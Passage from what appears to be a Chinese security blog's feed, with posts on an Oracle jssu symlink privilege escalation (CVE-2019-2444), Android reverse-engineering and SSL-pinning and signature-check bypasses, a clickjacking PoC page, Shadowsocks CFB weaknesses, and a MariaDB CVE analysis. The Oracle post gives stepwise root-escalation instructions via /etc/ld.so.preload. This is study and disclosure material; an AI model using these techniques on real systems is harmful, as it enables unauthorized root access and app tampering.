defined(__ANDROID__)</span></span><br><span class="line">+    android_errorWriteLog(<span class="number">0x534e4554</span>, <span class="string">"64211847"</span>);</span><br><span class="line">+  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">+    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">   ALOGV(<span class="string">"+++ zip good scan %"</span> PRIu16 <span class="string">" entries"</span>, num_entries);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原来 Android 就是这么被 root 的。结尾有彩蛋，Janus 分析（这算什么彩蛋）。&lt;/p&gt;
&lt;p&gt;先贴一个&lt;a href=&quot;https://elixir.bootlin.com/linux/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lin
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>关于 Oracle 的一条攻击链</title>
    <link href="https://github.com/Cracke-S-J/2020/04/01/%E5%85%B3%E4%BA%8EOracle%E7%9A%84%E4%B8%80%E6%9D%A1%E6%94%BB%E5%87%BB%E9%93%BE/"/>
    <id>https://github.com/Cracke-S-J/2020/04/01/%E5%85%B3%E4%BA%8EOracle%E7%9A%84%E4%B8%80%E6%9D%A1%E6%94%BB%E5%87%BB%E9%93%BE/</id>
    <published>2020-04-01T07:08:14.000Z</published>
    <updated>2020-04-21T10:30:19.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>这是 CVE-2019-2444。背景是有一个程序叫 jssu，是为 Oracle Scheduler 提供服务的组件，它的一些权限配置有问题，导致可以符号链接攻击造成提权。但是前提要有 oracle 账号，但是这可以配合 CVE-2018-3004 这个 Java 反序列化漏洞绕过 Oracle JVM 的一些安全机制，拿到 oracel 用户权限。</p><h2 id="CVE-2018-3004"><a href="#CVE-2018-3004" class="headerlink" title="CVE-2018-3004"></a>CVE-2018-3004</h2><p>CVE-2018-3004 简单介绍两句，XMLDecoder 反序列化，组装的时候，调用的方法是不被 Jvm 限制的，所以可以构造一个 FileWriter，实现 oracle 用户权限的任意写入。然后用本文主要介绍的这个 CVE 对它进行提权。</p><p>（这个漏洞没有搜到公开的资料，暂不做分析了（是我懒得去diff它，太难了））</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>主要有几下几个条件组合，成就了这个攻击：</p><ol><li>jssu 程序所在组是 oinstall，跟 oracle 同组，所有者是 root，设置了 suid，权限是 4750。</li><li>jssu 运行会生成一个日志文件，名字可以通过进程名得到，用户组跟 jssu 同组，权限是当前用户的 umask。</li></ol><p>所以就有了符号链接攻击思路，用 oracle 把那个日志文件挂上软链接，程序启动这样我们就有向任意文件写的能力，而且些文件读写权限 oracle 可控。如果软链接到 /etc/ld.so.preload，用可以来提权了。</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol><li>准备一个 /bin/bash；准备一个 so，插桩 hook geteuid 函数，来修改之前准备那个 /bin/bash 的权限为 04777，修改用户和用户组为 root。</li><li>构建一个可执行程序，先设置 umask 为 0000(为什么不是0666?)；然后 fork 子进程启动 jssu；父进程预判，给 jssu 的日志创建符号链接，等一段时间子进程输出内容以后把子进程 kill 掉。此时 /etc/ld.so.preload 已经被创建，所属用户 root，所属用户组 oinstall，权限 0666，内容为 jssu 的日志。</li><li>用 oracle 用户修改 /etc/ld.so.preload，把之前准备的 so 写入里面。</li><li>等待一个root权限进程调用 geteuid 函数，触发插桩的代码。这一步可以直接在命令行运行<code>sudo 2&gt;/dev/null &gt;/dev/null</code>，此时，之前准备的那个 shell 就被完成了权限修改，任意用户都可以通过在命令行运行这个 shell 获得一个 root 权限的 shell。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;这是 CVE-2019-2444。背景是有一个程序叫 jssu，是为 Oracle Scheduler 提供服务的组件，它的一些权限配置有问
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Android 逆向知识整理</title>
    <link href="https://github.com/Cracke-S-J/2020/03/31/android%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/Cracke-S-J/2020/03/31/android%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</id>
    <published>2020-03-31T08:40:34.000Z</published>
    <updated>2020-04-21T10:25:32.151Z</updated>
    
    <content type="html"><![CDATA[<p>通常会拿到一个 apk，然后分析它的攻击面。我之前太自负了，从来没有系统整理过。</p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>先大致查一下壳，不过现在有通用脱壳机一般不 care 这个。我一般是解压看一下。</p><h3 id="工具脱"><a href="#工具脱" class="headerlink" title="工具脱"></a>工具脱</h3><h4 id="Fdex2"><a href="#Fdex2" class="headerlink" title="Fdex2"></a>Fdex2</h4><p>一个 Xposed 插件，能脱一代壳。只是 hook 是相应的 dex 加载点。</p><h4 id="VitualApp"><a href="#VitualApp" class="headerlink" title="VitualApp"></a>VitualApp</h4><p>Bangcle 东明大佬魔改的 VitualApp，主要特点是不用 root，可以脱类抽，不过 load 所有类的时候可能会卡死。</p><h4 id="FART"><a href="#FART" class="headerlink" title="FART"></a>FART</h4><p>没用过，听说是刷机。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>Frida 脚本，可脱一代二代，hook loadClass，把相关功能点一点，就对应的内容会回填，填完了再 dump 出来即可。</p><h3 id="手脱"><a href="#手脱" class="headerlink" title="手脱"></a>手脱</h3><p>用 IDA 调，缺点是要过反调，一般是上面操作解决不了问题才上手，主要是脱 vmp 壳。</p><p>要分析它的指令替换的操作，正确地回填才能看到代码。也是体力活。</p><p>例如<a href="https://bbs.pediy.com/thread-257061.htm" target="_blank" rel="noopener">这个</a>。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><ol><li>我习惯 adb shell dumpsys activity top，从顶层 view 开始入手分析。</li><li>还可以调试，看它调用栈。</li><li>还可以 hook 打 log 出来帮忙分析。</li><li>总之就是经验+耐心。</li></ol><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><ol><li>基本就是过反调，可以用 Xposed 或者也有其它工具一键反调。smali。</li><li>so 的反调要看套路，要改转发端口，改名字，搜一下 kill、exit 之类的。</li><li>还有就是 IDA 要用熟吧。</li></ol><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><h3 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h3><ol><li>不能 findAndHook 接口和抽象方法。</li><li>子类没有重写父类方法也能 hook 到。</li><li>使用 XposedBridge.hookAllMethods 拦截抽象方法的具体实现方法。</li><li>只能 hook Java 层。</li><li>带壳 app 要让壳先 attachBaseContext，再用之后那个 classLoader。</li><li>找不到参数，用 Xposed 自身提供的 XposedHelpers 的 findClass方法加载每一个类，然后再将得到的类传递给 hook 函数作参数。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Java.available) &#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> application = Java.use(<span class="string">"android.app.Application"</span>);</span><br><span class="line">        <span class="keyword">var</span> reflectClass = Java.use(<span class="string">"java.lang.Class"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"application: "</span> + application);</span><br><span class="line"></span><br><span class="line">        application.attach.overload(<span class="string">'android.content.Context'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">this</span>.attach(context); <span class="comment">// 先执行原来的attach方法</span></span><br><span class="line">            <span class="keyword">var</span> classloader = context.getClassLoader(); <span class="comment">// 获取classloader</span></span><br><span class="line">            Java.classFactory.loader = classloader;</span><br><span class="line">            <span class="comment">//这不里能直接使用Java.use，因为java.use会检查在不在perform里面，不在就会失败</span></span><br><span class="line">            <span class="keyword">var</span> AyWelcome = Java.classFactory.use(<span class="string">"flytv.run.monitor.fragment.user.AyWelcome"</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"AyWelcome: "</span> + AyWelcome);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h3><ol><li>可 hook Java 层和 C 层。</li><li>可以早期无痛注入。Frida 在注入进程的时候，会使用 ptrace 来完成，所以在遇到具备反调试的应用时（如各种壳），会导致注入失败。测试发现，Frida 仅仅在注入的时候会使用 ptrace，只要在壳运行之前进行注入，可以无视各种反调试。使用Xposed进行辅助，在应用才运行的时候，按需暂停5s，再注入Frida脚本。</li></ol><h2 id="过签名校验"><a href="#过签名校验" class="headerlink" title="过签名校验"></a>过签名校验</h2><p>先大致看一下是不是无脑校验。如果无脑不用管。</p><p>在对APK进行签名的时候，签名工具会将包含原始签名信息的 .RSA/.DSA 文件放入APK（zip压缩包）的 /META-INF/ 目录下。在APK安装的时候，Android Framework 会使用其自身的机制对APK包中的文件进行完整性校验。同时，Android 应用本身也可以通过 android.content.pm.Signature 获取自身的签名信息，参考这里，如 Issuer、公钥等。如果 Android 应用在代码中预置了公钥，可通过比较公钥的方式进行完整性保护，确保当前的 APK 由开发者签发。</p><p>由于上述方法校验过程中需要调用系统相关的函数获取公钥，因此，可以通过热补丁的方式拦截当前 Android 应用运行时的 API 调用，在其获取签名的时候返回原始的信息，欺骗 Android 应用，让其认为获取到了原始的签名信息。</p><p>这里使用了阿里巴巴开源的热补丁框架 AndFix 进行 API 的调用拦截。AndFix 具有较好的兼容性，兼容市面上大多数机型、系统版本。使用该框架可以在运行时对指定的系统函数进行拦截，修改目标函数的执行逻辑。</p><p>还有一个什么方法，是字节的二面面试官提的，没听清，也不知道怎么联系，害，还有梆梆的什么技术也没听清，该死的信号。</p><h2 id="抓包问题"><a href="#抓包问题" class="headerlink" title="抓包问题"></a>抓包问题</h2><p>先 JustTrustMe 过掉所有官方客户端校验。</p><h3 id="如果抓不到包"><a href="#如果抓不到包" class="headerlink" title="如果抓不到包"></a>如果抓不到包</h3><ol><li>看是不是对证书做了强制校验，如果是，Xposed 掉。</li><li>看是不是不走代理，NO_Proxy、HttpURLConnection。</li><li>试试 ProxyDroid。</li><li>它走的非 http/https，打开 wireshark，确认一下传输协议。</li></ol><h3 id="时而抓到时而抓不到"><a href="#时而抓到时而抓不到" class="headerlink" title="时而抓到时而抓不到"></a>时而抓到时而抓不到</h3><ol><li>可能是遇到了 okhttp 有路由选择，运行时保存多条路由线路，当网络不通时，马上切换到下一条，其中包括 no_proxy 线路。可以 hook 此方法让每次切换的路由失败；也可能hook相关的调用些方法的类，让在网络超时后，不调用这个切换路由的方法，搜一下关键函数<code>RouteSelector.resetNextProxy(HttpUrl url, Proxy proxy)</code>。</li><li>用到 okhttp 的 Certificate Pinning 进行通信的，进行 hook droidproxy 等强制路由有可能会导致 ssl 握手失败，在 Xposed 里面装个 <a href="https://github.com/ac-pm/SSLUnpinning_Xposed">SSLUnpinning</a> 就解决问题了。</li></ol><h3 id="收不到返回包"><a href="#收不到返回包" class="headerlink" title="收不到返回包"></a>收不到返回包</h3><p>服务端也做了校验，（只能从客户端找证书？）。</p><h3 id="有二次加密"><a href="#有二次加密" class="headerlink" title="有二次加密"></a>有二次加密</h3><p>恭喜获得逆向之旅。找到加密函数以及密钥或者固定密钥写插件去破解它得到明文。</p><h3 id="正确的校验姿势"><a href="#正确的校验姿势" class="headerlink" title="正确的校验姿势"></a>正确的校验姿势</h3><p>客户端和服务端要建立对称加密通信。服务端生成公私钥对，把公钥用证书签名，发送给客户端，客户端校验证书，然后用这个公钥对对称加密的密钥加密，然后发送给服务端，服务端用私钥给公钥解密，然后它们就用这个公钥进行加密通信。</p><h2 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h2><h3 id="二进制代码保护"><a href="#二进制代码保护" class="headerlink" title="二进制代码保护"></a>二进制代码保护</h3><ul><li>DEX 文件加固强度不足</li><li>缺少 DEX 代码(classes.dex)加密保护</li><li>缺少 Dalvik 反调试检测</li><li>缺少 Native 反调试检测</li><li>缺少 Native 代码注入检测</li><li>缺少 Native 库(.so文件)加密保护</li><li>缺少脚本代码(Javascript、Lua 等文件)加密保护</li><li>缺少敏感资源文件加密保护</li><li>缺少自身签名完整性校验</li><li>缺少自身文件完整性校验</li></ul><h3 id="用户数据安全"><a href="#用户数据安全" class="headerlink" title="用户数据安全"></a>用户数据安全</h3><ul><li>客户端明文存储敏感信息<ul><li>SharedPreferences</li><li>SQLite</li></ul></li><li>明文传输核心业务数据<ul><li>http</li><li>可能看到的 https</li></ul></li><li>允许备份标记没有设置为关闭<ul><li>android:allowBackup 为显式地 False</li></ul></li><li>敏感信息界面截屏未进行提示</li><li>调试日志输出敏感信息</li><li>缺少运行环境安全性检查（Root？安装 Xposed？）</li></ul><h3 id="数据传输保护"><a href="#数据传输保护" class="headerlink" title="数据传输保护"></a>数据传输保护</h3><ul><li>使用 HTTP 进行核心业务数据交互</li><li>使用 ALLOW_ALL_HOSTNAME_VERIFIER 忽略 SSL 证书域名验证</li><li>自定义 HostnameVerifier 忽略 SSL 证书域名验证</li><li>自定义 X509TrustManager 未正确校验 SSL 证书链</li><li>自定义 WebViewClient 忽略 SSL 证书校验异常</li><li>端口开放风险（Hint:netstat 看有没有开放可疑的端口，如果有，逆向之旅看有没有可能被利用，比如<code>虫洞</code>。</li></ul><h3 id="加密算法及密钥安全"><a href="#加密算法及密钥安全" class="headerlink" title="加密算法及密钥安全"></a>加密算法及密钥安全</h3><ul><li>不合理配置加密算法<ul><li>加密核心、敏感数据时使用了不安全的 DES 加密算法</li><li>AES 加密时是否使用了不安全的 ECB 模式</li><li>RSA 加密时每次加密的结果是否是一样的</li></ul></li><li>密钥明文硬编码</li></ul><h3 id="跨进程交互安全"><a href="#跨进程交互安全" class="headerlink" title="跨进程交互安全"></a>跨进程交互安全</h3><p>全用 Drozer 可以测，还有个什么超级拒绝服务漏洞检测也可，但是找不到了。</p><ul><li>导出组件 Activity 拒绝服务漏洞</li><li>导出组件 Service 拒绝服务漏洞</li><li>导出组件 Broadcast Receiver 拒绝服务漏洞</li><li>导出组件 Content Provider 数据泄露</li><li>导出组件 Content Provider SQL 注入漏洞</li><li>导出组件 Content Provider 目录遍历漏洞</li></ul><h3 id="其它-Android-应用规范"><a href="#其它-Android-应用规范" class="headerlink" title="其它 Android 应用规范"></a>其它 Android 应用规范</h3><ul><li>允许调试标记没有设置为关闭（android:debuggable，现在好像无所谓了，是真的无所谓）</li><li>WebView addJavaScriptInterface 远程代码执行漏洞</li><li>WebView 存在潜在跨站脚本攻击风险（grep “setJavaScriptEnabled”）</li><li>允许 WebView 访问本地任意脚本（setAllowFileAccess(false)；对本地文件校验）</li><li>WebView BadKernel 远程代码执行漏洞(CVE-2016-6754)(CNNVD-201608-414)（v8 引擎问题，用 WebView 访问<a href="https://secboom.com/vul/Badkernel.html" target="_blank" rel="noopener">Badkernel</a>）</li><li>App沙箱文件权限设置错误（Context.MODE_WORLD_READABLE 和 Context.MODE_WORLD_WRITABLE）</li><li>Janus 漏洞（zip 压缩包漏洞，不要用 v1 签名）</li><li>访问第三方页面时未进行提示</li><li>未校验二维码域名</li><li>地址随机化</li><li>堆栈保护</li><li>点击劫持（可还行）</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>点击劫持 POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">Html,body,iframe&#123;</span><br><span class="line"><span class="css"><span class="selector-tag">Display</span><span class="selector-pseudo">:block</span>;      <span class="comment">/*此处可以设为null*/</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">Height</span><span class="selector-pseudo">:100</span>%;</span></span><br><span class="line"><span class="css"><span class="selector-tag">Width</span><span class="selector-pseudo">:100</span>%;</span></span><br><span class="line"><span class="css"><span class="selector-tag">Margin</span><span class="selector-pseudo">:0</span>;</span></span><br><span class="line"><span class="css"><span class="selector-tag">Padding</span><span class="selector-pseudo">:0</span>;</span></span><br><span class="line"><span class="css"><span class="selector-tag">Border</span><span class="selector-pseudo">:nonne</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>点击劫持<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://XXX.jpg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://XXX.com "</span> <span class="attr">scrolling</span>=<span class="string">"no"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>   攻击URL</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在离开梆梆大半年了，不讨论离开的原因，夸一下梆梆。</p><p>有 Nemo 师傅和其它师傅带小弟，是真的香，还记得当初 Nemo 推荐我的方向、让我读的博客和代码，我全都没看完，是我不对，如果能耐心读完，肯定不止现在的代码能力。</p><p>每周五有技术分享（也不是每周），大家在一起讨论很酷的知识；还记得我分享的智能合约漏洞，一鸣大佬带着笔记过来听，还录屏录音（害，自闭自闭）。</p><p>团队很年轻，很有活力，每天都在学习和干活，大家在一起不会犯懒。</p><p>技术这边不是很官僚，当面试的时候看到一个好凶的大哥，不知道怎么叫，后来发现就是杰哥（手动狗头）；杰哥也是有个大哥的样子，虽然狡猾的很但是也很好的朋友。</p><p>非技术人员特别热情，叫一声 sj大佬 之类的，请教个问题，都特别到位，印象中好多售前、项目经理都特别好学，经常请教很多问题，让看代码就看代码，让改代码就改代码，让装 kali 就装 kali，没有接连否认自己不行。有的项目经理非科班出身，技术上也懂的很多。</p><p>还有有（较）硬核的 wiki，都是大佬们的骚操作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;通常会拿到一个 apk，然后分析它的攻击面。我之前太自负了，从来没有系统整理过。&lt;/p&gt;
&lt;h2 id=&quot;脱壳&quot;&gt;&lt;a href=&quot;#脱壳&quot; class=&quot;headerlink&quot; title=&quot;脱壳&quot;&gt;&lt;/a&gt;脱壳&lt;/h2&gt;&lt;p&gt;先大致查一下壳，不过现在有通用脱壳机一般不 
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 Shadowsocks 协议漏洞</title>
    <link href="https://github.com/Cracke-S-J/2020/03/25/%E6%B5%85%E8%B0%88ss%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://github.com/Cracke-S-J/2020/03/25/%E6%B5%85%E8%B0%88ss%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-03-25T05:29:08.000Z</published>
    <updated>2020-03-25T06:18:09.093Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="CFB-加密模式"><a href="#CFB-加密模式" class="headerlink" title="CFB 加密模式"></a>CFB 加密模式</h3><p>在此复习一下我们小学二年级学过的密码学知识。（在此安利一下 B 站 <a href="https://space.bilibili.com/456606920" target="_blank" rel="noopener">小学生Vita君</a>，没有恰饭，很可爱的小孩）</p><p>比如 AES-256-CFB，它是一种流式加密而不是分组加密，不会直接将明文进行 AES 操作，而是 xor(明文, AES(密文))。</p><p>由此可以得出以下三个结论：</p><ol><li>CFB 的加密和解密函数是一样的，因为最后一步是 xor，连续加密两遍就是本身。</li><li>密文的某个 byte 被篡改后，解密出来的该 byte 是错的，第 N+1 个block也是错的，其他数据都是正确的。</li><li>在给定的 key 和 iv 下，cfb 的每个 block 退化为普通的 xor，已知某段明文和和对应的密文时，可以算出使用的 xor_key，从而可以对该段明文密文进行伪造。这个很重要，因为这样就可以 qiang 你了（滑稽</li></ol><h3 id="ss-整体工作流程"><a href="#ss-整体工作流程" class="headerlink" title="ss 整体工作流程"></a>ss 整体工作流程</h3><p>浏览器用 socks5 代理，将数据包发给 sslocal，sslocal 加密，发给 ssserver，ssserver 解密数据，访问指定资源，返回加密的数据，sslocal 再解密，将数据返回给浏览器。</p><p>加密和解密主要是下面那样：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加密</span></span><br><span class="line">data = sock5Header + httpRequest</span><br><span class="line">rand_iv + AES-cfb(key, rand_iv, data)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">httpResponse = AES-cfb(key, rand_iv2, recv_data)</span><br></pre></td></tr></table></figure><p>看起来攻击者知道 rand_iv1 和 rand_iv2，但是不知道 key，不能整体解密。</p><h2 id="Case1-解密-http-返回包"><a href="#Case1-解密-http-返回包" class="headerlink" title="Case1 解密 http 返回包"></a>Case1 解密 http 返回包</h2><p>从 ssserver 来的返回包，加密包的第一个 block 是可以猜到的，是 HTTP/1.1，所以 key[:8] 可以算出来了，然后我们就拥有了伪造前 8 个字节的能力。可能给它发送到指定端口来监听。</p><h2 id="Case2-解密指定-domain-的-httpRequest包"><a href="#Case2-解密指定-domain-的-httpRequest包" class="headerlink" title="Case2 解密指定 domain 的 httpRequest包"></a>Case2 解密指定 domain 的 httpRequest包</h2><p>由于 requests 包的前几个字节是<code>0x1 ip port</code>，猜起来比较困难，所以我们只能在它 domain 表式的情况下<code>0x03 + domain_len + domain + port</code>，猜个这个，然后也可以改掉。</p><h2 id="Case3-确认-https-流量是否属于某个域名"><a href="#Case3-确认-https-流量是否属于某个域名" class="headerlink" title="Case3 确认 https 流量是否属于某个域名"></a>Case3 确认 https 流量是否属于某个域名</h2><p>在 https 的情况下，我们什么都看不到了，只知道它是个包，但是无所谓，用 Case2 的方法猜到域名就 ok，然后直接封掉你（误。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/LeadroyaL/ss-redirect-vuln-exp">https://github.com/LeadroyaL/ss-redirect-vuln-exp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h2&gt;&lt;h3 id=&quot;CFB-加密模式&quot;&gt;&lt;a href=&quot;#CFB-加密模式&quot; class=&quot;headerlink&quot; title=&quot;C
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
  </entry>
  
  <entry>
    <title>MariaDB (CVE-2020-7221) 提权漏洞分析</title>
    <link href="https://github.com/Cracke-S-J/2020/03/24/mariadb%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/Cracke-S-J/2020/03/24/mariadb%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-03-24T13:21:37.000Z</published>
    <updated>2020-03-31T07:15:33.805Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可 MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。在存储引擎方面，使用XtraDB（英语：XtraDB）来代替MySQL的InnoDB。 MariaDB由MySQL的创始人Michael Widenius（英语：Michael Widenius）主导开发，他早前曾以10亿美元的价格，将自己创建的公司MySQL AB卖给了SUN，此后，随着SUN被甲骨文收购，MySQL的所有权也落入Oracle的手中。MariaDB名称来自Michael Widenius的女儿Maria的名字。</p><p>——摘自百度百科</p></blockquote><p>反正我冇听说过，但是通过分析这个 CVE，我发现 CVE 也不都是那种高大上的 Linux Kernel 二进制漏洞，或者通用组件那种协议逻辑漏洞，可能就一个 jio 本写的有问题，就能实现提权。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>趁晚上没人、Nightly 还没开始跑，上公司 server 折腾一把。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mariadb:10.4.8</span><br><span class="line">docker run -it 2ef19234ff46 /bin/bash</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点在这个 jio 本 <code>find / -name &quot;mysql_install_db&quot;</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果设置了 --user 进入这里</span></span><br><span class="line">481 <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">"<span class="variable">$user</span>"</span></span><br><span class="line">482 <span class="keyword">then</span></span><br><span class="line">483   chown <span class="variable">$user</span> <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir"</span> &amp;&amp; \</span><br><span class="line">484   chmod 0700 <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir"</span></span><br><span class="line">485   <span class="keyword">if</span> <span class="built_in">test</span> $? -ne 0</span><br><span class="line">486   <span class="keyword">then</span></span><br><span class="line">487       <span class="built_in">echo</span> <span class="string">"Cannot change ownership of the '<span class="variable">$pamtooldir</span>/auth_pam_tool_dir' directory"</span></span><br><span class="line">488       <span class="built_in">echo</span> <span class="string">" to the '<span class="variable">$user</span>' user. Check that you have the necessary permissions and try again."</span></span><br><span class="line">489       <span class="built_in">exit</span> 1</span><br><span class="line">490   <span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 如果没有设置 --srcdir 进入这里</span></span><br><span class="line">491   <span class="keyword">if</span> <span class="built_in">test</span> -z <span class="string">"<span class="variable">$srcdir</span>"</span></span><br><span class="line">492   <span class="keyword">then</span></span><br><span class="line">493     chown 0 <span class="string">"<span 